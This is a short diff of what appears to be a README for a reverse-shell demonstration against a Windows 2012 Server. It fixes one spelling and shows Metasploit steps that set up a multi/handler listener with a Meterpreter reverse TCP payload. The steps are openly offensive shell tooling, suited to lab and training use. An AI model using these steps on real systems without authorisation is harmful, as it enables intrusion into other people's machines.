@@ -9,7 +9,7 @@ This is a demonstration of obtaining a reverse shell on a Windows 2012 Server. T
 # Step 1 : Create a reverse handler using metasploit. To do so, you run the following commands -
   - 1 - sudo msfconsole <br>
   - 2 - use multi/handler <br>
-  - 3 - configure payload (preferable : windows/meterpreter/rerverse_tcp) <br>
+  - 3 - configure payload (preferrable : windows/meterpreter/rerverse_tcp) <br>
   - 4 - ensure that the "LHOST" and "LPORT" settings are correctly configured. You may do so, by running : set LHOST <IP Address of Host> and the set LPORT <port you would like to listen on> <br>
   - 5 - once this has been completed, you may run : run -j or exploit -j at the msf prompt. This will create a persistent listener that will exit once you tell it to, if a disconnect from the client(victim) is received. After doing so, you should see the following screen : <br>
   
